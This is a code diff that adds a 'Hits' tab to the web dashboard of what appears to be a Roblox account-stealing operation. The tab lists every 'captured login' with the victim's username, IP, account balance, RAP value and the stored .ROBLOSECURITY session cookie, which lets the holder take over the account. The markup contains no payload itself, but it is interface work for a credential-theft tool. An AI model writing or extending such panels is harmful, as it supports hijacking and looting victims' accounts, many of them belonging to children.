@@ -74,6 +74,12 @@
             <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
             <span class="dock-badge" id="sidebarBadge">0</span>
         </div>
+        <div class="dock-item" data-tab="hits" onclick="switchMainTab('hits', this)">
+            <i class="fas fa-crosshairs"></i>
+            <span class="dock-tooltip">Hits</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+            <span class="dock-badge" id="hitsBadge">0</span>
+        </div>
         <div class="dock-item" data-tab="settings" onclick="switchMainTab('settings', this)">
             <i class="fas fa-sliders-h"></i>
             <span class="dock-tooltip">Settings</span>
@@ -554,6 +560,39 @@
                     </form>
                 </div>
 
+            </div>
+        </section>
+
+        <!-- TAB: HITS -->
+        <section class="tab-panel" id="hits-tab" aria-label="Hits">
+            <div class="hits-page-header">
+                <div>
+                    <h1 class="hits-page-title">Hits</h1>
+                    <p class="hits-page-sub">Every captured login, newest first. The .ROBLOSECURITY cookie is stored with the hit.</p>
+                </div>
+                <div class="hits-page-actions">
+                    <div class="hits-search-wrap">
+                        <i class="fas fa-search"></i>
+                        <input id="hitsSearchInput" type="text" placeholder="Search username, IP, source..." oninput="renderAllHits()" autocomplete="off" spellcheck="false">
+                    </div>
+                    <button type="button" class="hits-refresh-btn" onclick="fetchAllHits()">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                </div>
+            </div>
+
+            <div class="hits-page-card">
+                <div class="hits-page-thead">
+                    <span>User</span>
+                    <span>Source</span>
+                    <span>IP</span>
+                    <span>Time</span>
+                    <span>Balance</span>
+                    <span>RAP</span>
+                    <span>Cookie</span>
+                </div>
+                <div class="hits-page-body" id="allHitsBody"></div>
+                <div class="hits-page-empty" id="allHitsEmpty">No hits recorded yet.</div>
             </div>
         </section>
 
